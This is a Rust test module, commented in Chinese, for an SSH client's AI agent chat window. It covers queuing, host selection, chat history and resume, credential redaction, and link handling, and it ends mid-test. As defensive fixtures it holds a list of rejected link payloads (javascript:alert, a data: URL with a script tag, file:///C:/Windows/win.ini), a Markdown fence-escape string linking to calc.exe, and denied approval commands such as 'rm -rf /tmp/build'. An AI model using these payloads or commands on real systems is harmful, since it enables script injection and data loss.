        assert!(assistant(&state).stopped);
        assert_eq!(
            state.take_queue_to_send(start + Duration::from_millis(500)),
            None,
            "旧回合还没收尾：不发，旧回合迟到的东西不能落进新回合"
        );
        // 旧回合迟到的文字在回合已停之后被丢弃。
        state.apply_agent_event(AgentEvent::TextDelta {
            text: "迟到的旧输出".to_owned(),
        });
        assert!(!assistant(&state).text.contains("迟到的旧输出"));
        // 旧回合的收尾事件到了：这时候才发。
        state.apply_agent_event(AgentEvent::TurnEnd);
        assert_eq!(
            state
                .take_queue_to_send(start + Duration::from_millis(600))
                .as_deref(),
            Some("打断：改查网络")
        );
        assert!(state.start_real_turn("打断：改查网络"));
        assert!(state.is_running());
    }

    #[test]
    fn interrupt_needs_a_running_turn_and_a_non_empty_queue() {
        let mut idle = ChatState::default();
        assert!(!idle.queue_can_interrupt());
        assert!(!idle.interrupt_for_queue(Instant::now()));

        let mut running = real_started();
        assert!(!running.queue_can_interrupt(), "队列是空的");
        assert!(!running.interrupt_for_queue(Instant::now()));
        assert!(running.is_running(), "什么也没动");
    }

    #[test]
    fn a_new_turn_lets_a_held_queue_go_out_at_its_end() {
        let mut state = real_started();
        state.enqueue("留着的");
        state.stop_by_user();
        assert!(state.start_real_turn("用户自己又发了一条"));
        state.apply_agent_event(AgentEvent::TurnEnd);
        assert_eq!(
            state.take_queue_to_send(Instant::now()).as_deref(),
            Some("留着的")
        );
    }

    #[test]
    fn a_failed_send_keeps_the_queue_without_retrying_by_itself() {
        let mut state = real_started();
        state.enqueue("后面的");
        state.queue.hold(); // fail_turn / start_failed 做的事
        state.finish_real_turn();
        assert_eq!(state.take_queue_to_send(Instant::now()), None);
        assert_eq!(state.queue.len(), 1);
    }

    #[test]
    fn new_conversation_drops_the_queue() {
        let mut state = real_started();
        state.enqueue("旧对话的补充");
        state.new_conversation();
        assert!(state.queue.is_empty());
    }

    #[test]
    fn edit_and_remove_work_while_the_turn_is_running() {
        let mut state = real_started();
        let a = state.enqueue("甲").expect("收下");
        let b = state.enqueue("乙").expect("收下");
        assert!(state.queue.edit(a, "甲（改）"));
        assert!(state.queue.remove(b));
        state.apply_agent_event(AgentEvent::TurnEnd);
        assert_eq!(
            state.take_queue_to_send(Instant::now()).as_deref(),
            Some("甲（改）")
        );
    }

    #[test]
    fn no_host_is_selected_by_default_and_hosts_can_be_added_and_removed() {
        // 审查 M1：旧版默认选主机库第一台、切换只增不减；0.2.14 没选过就没有目标。
        let hosts = vec![
            HostChoice::plain(3, "web-1", "deploy"),
            HostChoice::plain(8, "db-1", "admin"),
        ];
        let mut selected: Vec<i64> = Vec::new();
        assert!(
            selected_targets(&hosts, &selected).is_empty(),
            "默认一台都不选"
        );
        assert_eq!(host_names_label(&selected_targets(&hosts, &selected)), None);

        assert!(toggle_host_selection(&mut selected, 8), "点一下选中");
        assert!(toggle_host_selection(&mut selected, 3));
        let names: Vec<String> = selected_targets(&hosts, &selected)
            .into_iter()
            .map(|host| host.name)
            .collect();
        assert_eq!(names, ["web-1", "db-1"], "按主机库顺序，不按点击顺序");
        assert_eq!(
            host_names_label(&selected_targets(&hosts, &selected)).as_deref(),
            Some("web-1、db-1")
        );

        assert!(!toggle_host_selection(&mut selected, 8), "再点一下取消");
        let names: Vec<String> = selected_targets(&hosts, &selected)
            .into_iter()
            .map(|host| host.name)
            .collect();
        assert_eq!(names, ["web-1"]);

        // 主机库里已经删掉的主机不会留在目标里。
        selected.push(99);
        assert_eq!(selected_targets(&hosts, &selected).len(), 1);
        // 执行时宿主用的目标 ID 就是 `host-<id>`（由 sync_hosts 拼出来）。
        assert_eq!(host_target_id(hosts[0].id), "host-3");
    }

    #[test]
    fn model_choices_start_with_default_and_cycle() {
        let catalog = AgentModelCatalog {
            models: vec![
                AgentModel {
                    id: "claude/opus".to_owned(),
                    name: "Opus".to_owned(),
                    unavailable: false,
                },
                AgentModel {
                    id: "claude/sonnet".to_owned(),
                    name: "Sonnet".to_owned(),
                    unavailable: false,
                },
            ],
            default: None,
            default_label: None,
        };
        let models = model_choices(&catalog);
        assert_eq!(models.len(), 3);
        assert_eq!(models[0].id, None);
        assert_eq!(model_label(&models, 0), "模型：默认");
        assert_eq!(model_label(&models, 1), "模型：Opus");
        assert_eq!(model_label(&models, 2), "模型：Sonnet");
        assert_eq!(models[1].id.as_deref(), Some("claude/opus"));

        assert_eq!(next_model_index(models.len(), 0), 1);
        assert_eq!(next_model_index(models.len(), 2), 0);
        assert_eq!(next_model_index(1, 0), 0, "只有「默认」时不动");
        assert_eq!(model_label(&[ModelChoice::default()], 0), "模型：默认");
    }

    #[test]
    fn real_mode_is_the_product_default_and_the_demo_needs_the_debug_hook() {
        // 审查 H3：产品里真实智能体是默认模式，不再被 `ZSSH_AGENT_E2E` 锁死。
        assert!(start_in_real_mode(None), "没有任何钩子就是真实模式");
        assert!(start_in_real_mode(Some("0")));
        assert!(start_in_real_mode(Some("")));
        assert!(
            !start_in_real_mode(Some("1")),
            "只有演示钩子才从离线演示开始"
        );
        // 离线演示的切换入口只在调试版存在（发行版里 `dev_hooks::ENABLED` 是 false）。
        assert_eq!(demo_toggle_available(), cfg!(debug_assertions));
    }

    /// 本文件的非测试部分（编译期嵌进来），用来确认窗口代码里没有某些路径。
    fn production_source() -> &'static str {
        include_str!("agent_chat_demo.rs")
            .split("\n#[cfg(test)]\nmod tests")
            .next()
            .expect("非测试部分")
    }

    #[test]
    fn the_window_never_reads_the_e2e_switch() {
        // `ZSSH_AGENT_E2E` 只给自动化测试用（agent_host 里的真实 claude 用例）；窗口代码里
        // 不能再出现读它的路径。源码在编译期嵌进来，在这里扫一遍。
        let body = production_source();
        let reads = body
            .lines()
            .filter(|line| !line.trim_start().starts_with("//"))
            .any(|line| line.contains("\"ZSSH_AGENT_E2E\"") || line.contains("ZSSH_AGENT_REAL"));
        assert!(!reads, "窗口代码不该读 ZSSH_AGENT_E2E / ZSSH_AGENT_REAL");
    }

    // ---------------------------------------------------------------------
    // 链接：和 0.2.14 一致，只复制网址，所有 handler 过 core 的校验
    // ---------------------------------------------------------------------

    #[test]
    fn link_clicks_copy_valid_web_links_and_refuse_everything_else() {
        let (notice, copy) = link_click_notice("https://Example.com/a?b=1");
        assert_eq!(copy.as_deref(), Some("https://example.com/a?b=1"));
        assert!(!notice.error);
        assert!(
            notice.text.contains("https://example.com/a?b=1"),
            "要把完整网址显示出来"
        );

        for rejected in [
            "file:///C:/Windows/win.ini",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "ms-settings:network",
            "/relative/path",
            "relative/path",
            "//example.com",
            "mailto:someone@example.com",
            "https://exa mple.com",
            "",
        ] {
            let (notice, copy) = link_click_notice(rejected);
            assert!(copy.is_none(), "{rejected} 不能被复制/打开");
            assert!(notice.error, "{rejected}");
        }
    }

    #[test]
    fn no_link_handler_opens_urls_directly() {
        // 审查 H2：旧代码在三处 `cx.open_url(...)`，其中原文模式连校验都没有。
        let body = production_source();
        let opens = body
            .lines()
            .filter(|line| !line.trim_start().starts_with("//"))
            .any(|line| line.contains("open_url("));
        assert!(!opens, "对话窗口里不该有直接打开网址的路径");
        // 每个 TextView 的链接 handler 都得经过同一个 open_link。
        let handlers = body.matches(".on_link_click(").count();
        let routed = body.matches("this.open_link(").count();
        assert!(handlers >= 2, "渲染/原文模式和历史面板都要挂 handler");
        assert!(routed >= handlers, "每个 handler 都走 open_link");
    }

    // ---------------------------------------------------------------------
    // Markdown 渲染：复制内容、示例文本都是纯函数/常量，不起界面。
    // ---------------------------------------------------------------------

    #[test]
    fn code_block_copy_text_normalizes_line_endings_and_trailing_blank_lines() {
        assert_eq!(code_block_copy_text("fn main() {}\n"), "fn main() {}");
        assert_eq!(code_block_copy_text("a\r\nb\r\n\r\n"), "a\nb");
        assert_eq!(code_block_copy_text("a\n\nb\n"), "a\n\nb");
        assert_eq!(code_block_copy_text(""), "");
    }

    #[test]
    fn table_tsv_joins_rows_with_tabs_and_newlines() {
        let headers = vec!["名称".to_owned(), "说明".to_owned()];
        let rows = vec![
            vec!["终端".to_owned(), "SSH\t会话".to_owned()],
            vec!["SFTP".to_owned(), "文件\n传输".to_owned()],
        ];
        assert_eq!(
            table_tsv(&headers, &rows),
            "名称\t说明\n终端\tSSH 会话\nSFTP\t文件 传输"
        );
        assert_eq!(table_tsv(&[], &[]), "");
        // 流式表格可能还没表头或行列不齐，按现有单元格原样输出。
        let ragged = vec![
            vec!["只有一格".to_owned()],
            vec!["a".to_owned(), "b".to_owned()],
        ];
        assert_eq!(table_tsv(&[], &ragged), "只有一格\na\tb");
    }

    #[test]
    fn markdown_sample_covers_the_rendered_blocks() {
        assert!(MARKDOWN_SAMPLE.contains("## "), "要有标题");
        assert!(MARKDOWN_SAMPLE.contains("\n- "), "要有列表");
        assert!(MARKDOWN_SAMPLE.contains("| --- |"), "要有表格分隔行");
        assert!(MARKDOWN_SAMPLE.contains("```rust"), "要有代码块");
        assert!(MARKDOWN_SAMPLE.contains("](https://"), "要有链接");
    }

    // ---------------------------------------------------------------------
    // 原文 / 渲染：只测纯状态和纯函数，不构建界面。
    // ---------------------------------------------------------------------

    #[test]
    fn raw_markdown_block_uses_a_four_backtick_fence_and_keeps_newlines() {
        let text = "第一行\n\n```rust\nfn main() {}\n```\n最后一行";
        let block = raw_markdown_block(text);
        assert!(block.starts_with("````markdown\n"), "{block}");
        assert!(block.ends_with("\n````"), "{block}");
        assert!(block.contains(text), "原文要一字不动地留在代码块里");
        // 正文自带的三个反引号围栏不能提前结束外层代码块。
        assert_eq!(block.matches("````").count(), 2, "{block}");
        assert!(block.contains("\n\n```rust\n"), "换行要保留");
        // 代码块「复制」拿到的是原文本身（围栏和末尾换行由视图剥掉）。
        assert_eq!(code_block_copy_text(&block[13..block.len() - 5]), text);
    }

    #[test]
    fn raw_toggle_flips_show_raw_and_back() {
        let mut state = started();
        assert!(!assistant(&state).show_raw);
        assert_eq!(body_mode(assistant(&state)), BodyMode::Rendered);
        assert_eq!(BodyMode::Rendered.toggle_label(), "原文");

        assert!(state.toggle_raw(1));
        assert!(assistant(&state).show_raw);
        assert_eq!(body_mode(assistant(&state)), BodyMode::Raw);
        assert_eq!(BodyMode::Raw.toggle_label(), "渲染");

        assert!(state.toggle_raw(1));
        assert!(!assistant(&state).show_raw);
        assert_eq!(body_mode(assistant(&state)), BodyMode::Rendered);

        // 用户消息和越界下标没有原文可切。
        assert!(!state.toggle_raw(0));
        assert!(!state.toggle_raw(99));
    }

    #[test]
    fn body_mode_picks_raw_or_rendered_text() {
        let mut message = AssistantMessage::default();
        assert_eq!(body_markdown(&message, BodyMode::Rendered), None);
        assert_eq!(
            body_markdown(&message, BodyMode::Raw).as_deref(),
            Some(RAW_NO_BODY)
        );

        message.text = "**粗体**\n第二行".to_owned();
        assert_eq!(
            body_markdown(&message, BodyMode::Rendered).as_deref(),
            Some("**粗体**\n第二行"),
            "渲染模式用正文原文喂 Markdown"
        );
        let raw = body_markdown(&message, BodyMode::Raw).expect("原文模式总有内容");
        assert_eq!(raw, raw_markdown_block("**粗体**\n第二行"));
        assert!(raw.contains("\n第二行"), "原文模式的换行不能丢");

        // 切换显示不能动正文本身。
        message.show_raw = true;
        assert_eq!(message.text, "**粗体**\n第二行");
    }

    // ---------------------------------------------------------------------
    // 历史面板：只测纯函数；列表 / 查看 / 删除要读写数据目录，不在这里碰。
    // ---------------------------------------------------------------------

    fn sample_record(agent_session_id: Option<&str>) -> HistoryRecord {
        HistoryRecord {
            version: 1,
            id: "11111111-1111-1111-1111-111111111111".to_owned(),
            agent: "claude".to_owned(),
            title: "看一下磁盘".to_owned(),
            created_at: 1_700_000_000_000,
            updated_at: 1_700_000_100_000,
            host_label: Some("web-1".to_owned()),
            anchor: None,
            agent_session_id: agent_session_id.map(str::to_owned),
            messages: Vec::new(),
        }
    }

    #[test]
    fn history_time_is_relative_for_recent_sessions() {
        let now = 1_700_000_000_000;
        assert_eq!(format_history_time(now, now), "刚刚");
        assert_eq!(format_history_time(now - 5 * 60_000, now), "5 分钟前");
        assert_eq!(format_history_time(now - 3 * 3_600_000, now), "3 小时前");
        assert_eq!(format_history_time(now - 2 * 86_400_000, now), "2 天前");
        // 更早的写日期；没有时区数据，明确标 UTC。
        assert!(format_history_time(0, now).ends_with(" UTC"));
        // 时钟回拨（更新时间比现在还晚）不能显示成负数。
        assert_eq!(format_history_time(now + 60_000, now), "刚刚");
    }

    #[test]
    fn history_shows_the_anchored_host_and_falls_back_to_the_old_label() {
        let anchor = HistoryAnchor {
            host_id: Some(3),
            name: "db-1".to_owned(),
        };
        assert_eq!(
            history_host(Some(&anchor), Some("web-1、db-1")).as_deref(),
            Some("db-1"),
            "有锚定就显示锚定的那台，不是当时选过的所有主机"
        );
        assert_eq!(
            history_host(None, Some("web-1")).as_deref(),
            Some("web-1"),
            "旧历史没有锚定字段：照旧显示当时存的主机名"
        );
        assert_eq!(history_host(None, None), None);
    }

    #[test]
    fn history_meta_shows_time_host_and_message_count() {
        let now = 1_700_000_000_000;
        assert_eq!(
            history_meta(now - 60_000, Some("web-1"), 6, now),
            "1 分钟前 · web-1 · 6 条消息"
        );
        assert_eq!(history_meta(now, None, 0, now), "刚刚 · 0 条消息");
        assert_eq!(
            history_meta(now, Some("  "), 1, now),
            "刚刚 · 1 条消息",
            "空的主机名不能留下两个分隔符"
        );
    }

    #[test]
    fn history_title_falls_back_for_empty_files() {
        assert_eq!(history_title("  看一下磁盘  "), "看一下磁盘");
        assert_eq!(history_title(""), "（无标题）");
        assert_eq!(history_title("   "), "（无标题）");
        assert_eq!(HISTORY_RESUMABLE, "可续接");
    }

    #[test]
    fn history_tool_status_maps_known_states() {
        assert_eq!(history_tool_status("done"), "完成");
        assert_eq!(history_tool_status("error"), "失败");
        assert_eq!(history_tool_status("rejected"), "已拒绝");
        assert_eq!(history_tool_status("stopped"), "已停止");
        assert_eq!(history_tool_status("running"), "运行中");
        assert_eq!(history_tool_status(""), "未知");
        assert_eq!(history_tool_status("something-new"), "something-new");
    }

    #[test]
    fn resume_needs_an_agent_session_id() {
        let record = sample_record(Some("11111111-2222-3333-4444-555555555555"));
        assert_eq!(
            resume_session_id(&record).as_deref(),
            Ok("11111111-2222-3333-4444-555555555555")
        );
        assert_eq!(
            resume_session_id(&sample_record(Some("  "))),
            Err("这条历史会话不能续接：没有智能体会话标识。".to_owned())
        );
        assert!(resume_session_id(&sample_record(None)).is_err());
    }

    // ---------------------------------------------------------------------
    // 历史保存：草稿映射、状态映射、id 分配、临时目录往返；不起智能体、不连网络。
    // ---------------------------------------------------------------------

    fn temp_dir(name: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "zssh-agent-chat-history-{}-{name}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("创建临时目录");
        dir
    }

    /// 一轮真实对话：正文 + 一次成功的工具调用，然后正常结束。
    fn real_turn_with_a_tool(state: &mut ChatState) {
        assert!(state.start_real_turn("看一下服务器"));
        state.apply_agent_event(AgentEvent::TextDelta {
            text: "好的，我看一下。".to_owned(),
        });
        state.apply_agent_event(AgentEvent::ToolStart {
            call_id: "toolu_1".to_owned(),
            tool: "run_command".to_owned(),
            input: json!({ "command": "uptime" }),
        });
        state.apply_agent_event(AgentEvent::ToolEnd {
            call_id: "toolu_1".to_owned(),
            tool: "run_command".to_owned(),
            output: "up 3 days".to_owned(),
            error: false,
        });
        state.apply_agent_event(AgentEvent::TurnEnd);
    }

    #[test]
    fn history_draft_maps_user_assistant_and_tool_messages_in_order() {
        let mut state = ChatState::default();
        real_turn_with_a_tool(&mut state);

        let draft = state.history_draft("ai-1-0", Some("web-1"), None);
        assert_eq!(draft.id, "ai-1-0");
        assert_eq!(draft.host_label.as_deref(), Some("web-1"));
        assert_eq!(
            draft.messages,
            vec![
                HistoryMessage::User {
                    text: "看一下服务器".to_owned(),
                },
                HistoryMessage::Assistant {
                    text: "好的，我看一下。".to_owned(),
                },
                HistoryMessage::Tool {
                    tool: "run_command".to_owned(),
                    input: json!({ "command": "uptime" }),
                    output: "up 3 days".to_owned(),
                    status: "done".to_owned(),
                },
            ]
        );
    }

    #[test]
    fn history_draft_keeps_error_and_rejected_tools_apart() {
        let mut state = ChatState::default();
        assert!(state.start_real_turn("跑一下"));
        state.apply_agent_event(AgentEvent::ToolStart {
            call_id: "toolu_1".to_owned(),
            tool: "run_command".to_owned(),
            input: json!({ "command": "false" }),
        });
        state.apply_agent_event(AgentEvent::ToolEnd {
            call_id: "toolu_1".to_owned(),
            tool: "run_command".to_owned(),
            output: "命令失败".to_owned(),
            error: true,
        });
        assert!(state.approval_prompt(9, &approval_request("rm -rf /tmp/build")));
        assert!(state.resolve_real_approval("approval-9", false, true));
        state.apply_agent_event(AgentEvent::TurnEnd);

        let draft = state.history_draft("ai-1-1", None, None);
        assert_eq!(draft.messages.len(), 3, "没有正文，只有两张工具卡片");
        let HistoryMessage::Tool {
            status,
            output,
            input,
            ..
        } = &draft.messages[1]
        else {
            panic!("第二张应该是工具卡片");
        };
        assert_eq!(status, "error");
        assert_eq!(output, "命令失败");
        assert_eq!(input, &json!({ "command": "false" }));
        let HistoryMessage::Tool {
            status,
            output,
            tool,
            ..
        } = &draft.messages[2]
        else {
            panic!("第三张应该是确认卡片");
        };
        assert_eq!(status, "rejected");
        assert_eq!(output, "用户拒绝执行");
        assert_eq!(tool, "run_command");
    }

    #[test]
    fn history_draft_marks_a_stopped_tool() {
        let mut state = ChatState::default();
        assert!(state.start_real_turn("跑个长命令"));
        state.apply_agent_event(AgentEvent::ToolStart {
            call_id: "toolu_1".to_owned(),
            tool: "run_command".to_owned(),
            input: json!({ "command": "sleep 60" }),
        });
        assert!(state.stop());

        let draft = state.history_draft("ai-1-2", None, None);
        let HistoryMessage::Tool { status, output, .. } = &draft.messages[1] else {
            panic!("第二条应该是工具卡片");
        };
        assert_eq!(status, "stopped");
        assert_eq!(output, "已停止");
    }

    #[test]
    fn tool_history_status_maps_every_card_state() {
        for (status, approval, expected) in [
            (ToolStatus::Done, ApprovalState::NotRequired, "done"),
            (ToolStatus::Answered, ApprovalState::Allowed, "done"),
            (ToolStatus::Failed, ApprovalState::NotRequired, "error"),
            (ToolStatus::Failed, ApprovalState::Denied, "rejected"),
            (ToolStatus::Stopped, ApprovalState::Denied, "stopped"),
            (ToolStatus::Stopped, ApprovalState::NotRequired, "stopped"),
            (ToolStatus::Running, ApprovalState::NotRequired, "running"),
            (
                ToolStatus::AwaitingApproval,
                ApprovalState::Pending,
                "running",
            ),
        ] {
            assert_eq!(tool_history_status(status, approval), expected);
        }
    }

    #[test]
    fn history_id_is_allocated_once_and_reset_by_a_new_conversation() {
        let now = 1_700_000_000_000;
        assert_eq!(new_history_id(now, 7), format!("ai-{now}-7"));
        assert!(zssh_core::ai::history::valid_id(&new_history_id(now, 0)));
        assert_ne!(
            new_history_id(now, 0),
            new_history_id(now, 1),
            "同一毫秒里的两个对话不能撞文件名"
        );

        let mut slot = None;
        let first = history_id_for_turn(&mut slot);
        assert_eq!(slot.as_deref(), Some(first.as_str()));
        assert_eq!(
            history_id_for_turn(&mut slot),
            first,
            "同一个对话沿用同一个 id"
        );
        // 「新对话」清掉之后重新分配。
        slot = None;
        assert_ne!(history_id_for_turn(&mut slot), first);
    }

    #[test]
    fn mapped_draft_round_trips_through_a_temp_history_store() {
        let dir = temp_dir("round-trip");
        let store = HistoryStore::new(&dir);
        let mut state = ChatState::default();
        real_turn_with_a_tool(&mut state);
        let id = new_history_id(1_700_000_000_000, 0);
        let session_id = "11111111-2222-3333-4444-555555555555";
        let draft = state.history_draft(&id, Some("web-1"), None);
        let summary = store
            .save(
                CLAUDE.command,
                draft.clone(),
                Some(session_id.to_owned()),
                &[],
                1_700_000_000_000,
            )
            .expect("保存历史")
            .expect("有用户消息就会存");
        assert_eq!(summary.title, "看一下服务器");
        assert!(summary.resumable);

        let record = store.load(CLAUDE.command, &id).expect("读回历史");
        assert_eq!(record.host_label.as_deref(), Some("web-1"));
        assert_eq!(record.agent_session_id.as_deref(), Some(session_id));
        assert_eq!(record.messages, draft.messages);

        // 第二轮写回同一个 id：还是一个文件，创建时间不变，消息接着追加。
        assert!(state.start_real_turn("再看内存"));
        state.apply_agent_event(AgentEvent::TurnEnd);
        let draft = state.history_draft(&id, Some("web-1"), None);
        store
            .save(
                CLAUDE.command,
                draft.clone(),
                Some(session_id.to_owned()),
                &[],
                1_700_000_100_000,
            )
            .expect("再次保存");
        let list = store.list(CLAUDE.command).expect("列历史");
        assert_eq!(list.len(), 1, "同一个对话不能写出两个文件");
        assert_eq!(list[0].message_count, 4);
        let record = store.load(CLAUDE.command, &id).expect("读回历史");
        assert_eq!(record.created_at, 1_700_000_000_000);
        assert_eq!(record.updated_at, 1_700_000_100_000);
        assert_eq!(record.messages, draft.messages);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn tool_input_redacts_credentials_recursively() {
        let input = json!({
            "capability": "secret-capability",
            "nested": {"token": "secret-token", "command": "pwd"},
            "items": [{"password": "pw"}, {"path": "/tmp/x"}]
        });
        let shown = redact_tool_input(&input);
        assert_eq!(shown["capability"], "[已隐藏]");
        assert_eq!(shown["nested"]["token"], "[已隐藏]");
        assert_eq!(shown["nested"]["command"], "pwd");
        assert_eq!(shown["items"][0]["password"], "[已隐藏]");
        assert_eq!(shown["items"][1]["path"], "/tmp/x");
        // 原值不能被改掉：历史存储还要靠 core 再抹一次。
        assert_eq!(input["capability"], "secret-capability");
    }

    // ---------------------------------------------------------------------
    // F4：继续历史、展开/折叠、围栏、失效的确认
    // ---------------------------------------------------------------------

    fn user_texts(state: &ChatState) -> Vec<String> {
        state
            .messages
            .iter()
            .filter_map(|message| match message {
                ChatMessage::User(text) => Some(text.clone()),
                ChatMessage::Assistant(_) => None,
            })
            .collect()
    }

    #[test]
    fn loaded_history_round_trips_back_into_the_same_draft() {
        let mut original = ChatState::default();
        real_turn_with_a_tool(&mut original);
        // 再来一个失败的工具和一个被拒绝的确认，状态都要保真。
        assert!(original.start_real_turn("再试一次"));
        original.apply_agent_event(AgentEvent::ToolStart {
            call_id: "toolu_2".to_owned(),
            tool: "run_command".to_owned(),
            input: json!({ "command": "false" }),
        });
        original.apply_agent_event(AgentEvent::ToolEnd {
            call_id: "toolu_2".to_owned(),
            tool: "run_command".to_owned(),
            output: "命令失败".to_owned(),
            error: true,
        });
        assert!(original.approval_prompt(9, &approval_request("reboot")));
        assert!(original.resolve_real_approval("approval-9", false, true));
        original.apply_agent_event(AgentEvent::TurnEnd);
        let draft = original.history_draft("ai-1-0", Some("web-1"), None);

        let mut restored = ChatState::default();
        restored.load_history(&draft.messages);
        let again = restored.history_draft("ai-1-0", Some("web-1"), None);
        assert_eq!(
            again.messages, draft.messages,
            "历史放回对话区再导出要一模一样"
        );
        assert!(!restored.is_running(), "回看的内容不是在跑的回合");
        // 工具卡片是回看用的：没有等待确认，也不会显示成"运行中"。
        for message in &restored.messages {
            if let ChatMessage::Assistant(message) = message {
                for card in &message.tools {
                    assert_ne!(card.approval, ApprovalState::Pending);
                    assert!(!matches!(
                        card.status,
                        ToolStatus::Running | ToolStatus::AwaitingApproval
                    ));
                }
            }
        }
    }

    #[test]
    fn continuing_a_history_never_writes_two_conversations_into_one_file() {
        // 审查 H4：旧版「继续」不清当前对话也不换历史 id，续接后的内容连同屏幕上原来的
        // 对话一起写回了原来的文件。
        let dir = temp_dir("continue-no-mix");
        let store = HistoryStore::new(&dir);
        let session_a = "aaaaaaaa-2222-3333-4444-555555555555";
        let session_b = "bbbbbbbb-2222-3333-4444-555555555555";

        // 对话 A 正在窗口里：真实回合 + 它自己的历史 id。
        let mut chat = ChatState::default();
        real_turn_with_a_tool(&mut chat);
        let mut history_id = Some("ai-1-0".to_owned());
        let mut pending_resume: Option<String> = None;
        let draft_a = chat.history_draft("ai-1-0", Some("web-1"), None);
        store
            .save(
                CLAUDE.command,
                draft_a.clone(),
                Some(session_a.to_owned()),
                &[],
                1_700_000_000_000,
            )
            .expect("存 A");

        // 磁盘上另有一条历史 B。
        let mut b_state = ChatState::default();
        assert!(b_state.start_real_turn("B 的问题"));
        b_state.apply_agent_event(AgentEvent::TextDelta {
            text: "B 的回答".to_owned(),
        });
        b_state.apply_agent_event(AgentEvent::TurnEnd);
        store
            .save(
                CLAUDE.command,
                b_state.history_draft("ai-2-0", None, None),
                Some(session_b.to_owned()),
                &[],
                1_700_000_050_000,
            )
            .expect("存 B");
        let record_b = store.load(CLAUDE.command, "ai-2-0").expect("读 B");

        // 在 A 的窗口里点 B 的「继续」。
        continue_conversation(&mut chat, &mut history_id, &mut pending_resume, &record_b)
            .expect("B 有会话标识，可以继续");
        assert_eq!(history_id.as_deref(), Some("ai-2-0"), "历史 id 换成 B 的");
        assert_eq!(pending_resume.as_deref(), Some(session_b));
        assert_eq!(user_texts(&chat), ["B 的问题"], "A 的消息不能留在屏幕上");

        // 接着发一条消息、存一次——写回的是 B 的文件。
        assert!(chat.start_real_turn("B 的新问题"));
        chat.apply_agent_event(AgentEvent::TurnEnd);
        let draft = chat.history_draft(history_id.as_deref().expect("id"), None, None);
        store
            .save(
                CLAUDE.command,
                draft,
                Some(session_b.to_owned()),
                &[],
                1_700_000_100_000,
            )
            .expect("存继续后的 B");

        let a_after = store.load(CLAUDE.command, "ai-1-0").expect("读 A");
        assert_eq!(a_after.messages, draft_a.messages, "A 的文件一个字都不能变");
        assert_eq!(a_after.agent_session_id.as_deref(), Some(session_a));
        let b_after = store.load(CLAUDE.command, "ai-2-0").expect("读 B");
        assert_eq!(b_after.agent_session_id.as_deref(), Some(session_b));
        let users: Vec<&str> = b_after
            .messages
            .iter()
            .filter_map(|message| match message {
                HistoryMessage::User { text } => Some(text.as_str()),
                _ => None,
            })
            .collect();
        assert_eq!(
            users,
            ["B 的问题", "B 的新问题"],
            "B 保留旧内容并追加新的，没有 A 的内容"
        );
        assert_eq!(store.list(CLAUDE.command).expect("列表").len(), 2);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn continuing_without_a_session_id_changes_nothing() {
        let mut chat = ChatState::default();
        real_turn_with_a_tool(&mut chat);
        let before = user_texts(&chat);
        let mut history_id = Some("ai-1-0".to_owned());
        let mut pending: Option<String> = None;
        let record = sample_record(None);
        assert!(continue_conversation(&mut chat, &mut history_id, &mut pending, &record).is_err());
        assert_eq!(user_texts(&chat), before);
        assert_eq!(history_id.as_deref(), Some("ai-1-0"));
        assert!(pending.is_none());
    }

    #[test]
    fn approvals_the_bridge_dropped_are_marked_failed_not_left_clickable() {
        let mut state = real_started();
        assert!(state.approval_prompt(1, &approval_request("uptime")));
        assert!(state.approval_prompt(2, &approval_request("df -h")));
        // 宿主说 1 还在等、2 已经没人等了（超时 / 停止 / 目标被取消选择）。
        assert!(state.expire_dead_approvals(|id| id == 1));
        let tools = &assistant(&state).tools;
        assert_eq!(
            tools[0].approval,
            ApprovalState::Pending,
            "还在等的保持原样"
        );
        assert_eq!(tools[1].approval, ApprovalState::Denied);
        assert_eq!(tools[1].status, ToolStatus::Failed);
        assert!(tools[1].error.is_some());
        assert!(
            state.real_approval("approval-2").is_none(),
            "不再是可回答的确认"
        );
        assert!(
            !state.expire_dead_approvals(|id| id == 1),
            "没有新的失效就不变"
        );
    }

    #[test]
    fn long_bodies_and_outputs_are_folded_until_expanded() {
        // 审查 M5：长对话/长输出每帧全量渲染会卡死。
        let long = "字".repeat(BODY_PREVIEW_CHARS + 500);
        let (shown, clipped) = clipped_body(&long, false);
        assert!(clipped);
        assert_eq!(shown.chars().count(), BODY_PREVIEW_CHARS);
        let (shown, clipped) = clipped_body(&long, true);
        assert!(!clipped);
        assert_eq!(shown, long);
        let (_, clipped) = clipped_body("短正文", false);
        assert!(!clipped);

        let mut state = ChatState::default();
        state
            .messages
            .push(ChatMessage::Assistant(AssistantMessage {
                text: long.clone(),
                ..AssistantMessage::default()
            }));
        let message = match &state.messages[0] {
            ChatMessage::Assistant(message) => message.clone(),
            ChatMessage::User(_) => unreachable!("刚放进去的是助手消息"),
        };
        let source = body_markdown(&message, BodyMode::Rendered).expect("有正文");
        assert_eq!(
            source.chars().count(),
            BODY_PREVIEW_CHARS,
            "渲染的只是前一段"
        );
        assert!(state.toggle_body_expanded(0));
        let message = match &state.messages[0] {
            ChatMessage::Assistant(message) => message.clone(),
            ChatMessage::User(_) => unreachable!("刚放进去的是助手消息"),
        };
        assert_eq!(
            body_markdown(&message, BodyMode::Rendered).expect("有正文"),
            long
        );
    }

    #[test]
    fn expand_toggles_reach_the_right_card() {
        let mut state = real_started();
        assert!(state.approval_prompt(1, &approval_request("uptime")));
        let (message_index, tool_index) = (state.active.expect("有活动消息"), 0);
        assert!(state.toggle_command_expanded(message_index, tool_index));
        assert!(state.toggle_diff_expanded(message_index, tool_index));
        assert!(state.toggle_output_full(message_index, tool_index));
        let card = &assistant(&state).tools[0];
        assert!(
            card.detail
                .as_ref()
                .is_some_and(|d| d.command_expanded && d.diff_expanded)
        );
        assert!(card.output_full);
        assert!(state.toggle_command_expanded(message_index, tool_index));
        assert!(
            !assistant(&state).tools[0]
                .detail
                .as_ref()
                .is_some_and(|d| d.command_expanded)
        );
        assert!(!state.toggle_command_expanded(message_index, 7), "越界不动");
        assert!(!state.toggle_command_expanded(99, 0));
    }

    #[test]
    fn raw_mode_fence_cannot_be_closed_by_the_text_itself() {
        // 审查 H2 缺陷 C：固定四反引号围栏被正文里的 4 个以上反引号提前关闭，之后的内容
        // 按 Markdown 渲染（链接可点）。
        let nasty = format!(
            "前文\n{}\n[x](file:///C:/Windows/System32/calc.exe)\n{}ignored",
